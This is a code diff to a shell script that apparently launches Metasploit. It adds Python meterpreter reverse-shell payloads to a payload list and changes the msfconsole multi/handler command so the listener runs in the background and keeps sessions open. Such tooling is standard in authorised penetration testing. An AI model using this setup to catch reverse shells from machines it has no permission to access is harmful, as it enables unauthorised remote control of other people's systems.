@@ -35,6 +35,13 @@ PAYL[12]="cmd/unix/reverse_netcat"
 PAYL[13]="php/reverse_php"
 PAYL[14]="windows/vncinject/reverse_tcp"
 PAYL[15]="android/meterpreter/reverse_tcp"
+PAYL[16]="python/meterpreter/reverse_http"
+PAYL[17]="python/meterpreter/reverse_https"
+PAYL[18]="python/meterpreter/reverse_tcp_ssl"
+
+
+
+
 
 
 THEPAYLOAD=""
@@ -67,7 +74,8 @@ fi
 
 echo "Generated command is..."
 echo 'msfconsole -x "use exploit/multi/handler;set payload '$THEPAYLOAD';set LHOST '$IP';set LPORT '$port';exploit"'
-msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LHOST $IP;set LPORT $port;exploit"
+#msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LHOST $IP;set LPORT $port;exploit"
+msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LPORT $port; set ExitOnSession false; exploit -j"
 
 
 
